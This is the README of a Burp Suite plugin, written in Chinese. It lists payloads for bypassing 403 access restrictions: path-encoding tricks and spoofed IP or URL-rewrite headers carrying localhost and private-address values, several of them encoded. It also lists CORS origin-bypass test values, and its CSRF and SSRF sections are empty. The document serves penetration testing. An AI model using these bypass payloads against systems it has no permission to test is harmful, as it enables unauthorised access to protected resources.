# BypassAllInOne
> Burp Suite Bypass 插件

## 进度
目前只做了 Bypass 403 以及 Bypass CORS 两个

成功 Bypass 后会将成功的 Request 发送到 Repeater 模块

## Bypass
### 403
* path
```text
"..;/$path$query",
"/%2e/$path$query",
"/$path/$query",
"/$path..;/$query",
"/$path/..;/$query",
"/$path%20$query",
"/$path%09$query",
"/$path%00$query",
"/$path.json$query",
"/$path.css$query",
"/$path.html$query",
"/$path?$query",
"/$path??$query",
"/$path$query#test",
"/$path/.$query",
"//$path//$query",
"/./$path/./$query"
```

* Header
```text
"X-Custom-IP-Authorization",
"X-Forward-For",
"X-Remote-IP",
"X-Originating-IP",
"X-Remote-Addr",
"X-Client-IP",
"X-Real-IP",
"X-Forwarded-For",
"X-Forwarded",
"Forwarded-For",
"X-ProxyUser-Ip",
"X-Original-URL",
"Client-IP",
"True-Client-IP",
"Cluster-Client-IP",
"X-ProxyUser-Ip",
"Host",
"Redirect",
"Referer",
"X-Forwarded-By",
"X-Forwarded-Host",
"X-True-IP",
"Proxy-Host",
"Request-Uri",
"X-Forwarded-For-Original",
"X-Forwarded-Server",
"X-Forwarder-For",
"X-Forward-For",
"Base-Url",
"Http-Url",
"Proxy-Url",
"Real-Ip",
"Referrer",
"Refferer",
"Uri",
"Url",
"X-Host",
"X-Http-Destinationurl",
"X-Http-Host-Override",
"X-Original-Remote-Addr",
"X-Proxy-Url",
"X-Rewrite-Url"

随机的 Value
"localhost",
"localhost:80",
"localhost:443",
"127.0.0.1",
"127.0.0.1:80",
"127.0.0.1:443",
"2130706433",
"0x7F000001",
"0177.0000.0000.0001",
"0",
"127.1",
"10.0.0.0",
"10.0.0.1",
"172.16.0.0",
"172.16.0.1",
"192.168.1.0",
"192.168.1.1"
```

* 特殊的Header
```text
"X-Original-URL","/",
"X-Rewrite-URL","/$path"
```

### CORS
Origin:https://vlun.com
```text
NULL: null
开头： https://vlun.com.1ndex.cn
结尾： https://1ndexvlun.com
正则.错误： https://vluncom
```

### CSRF


### SSRF

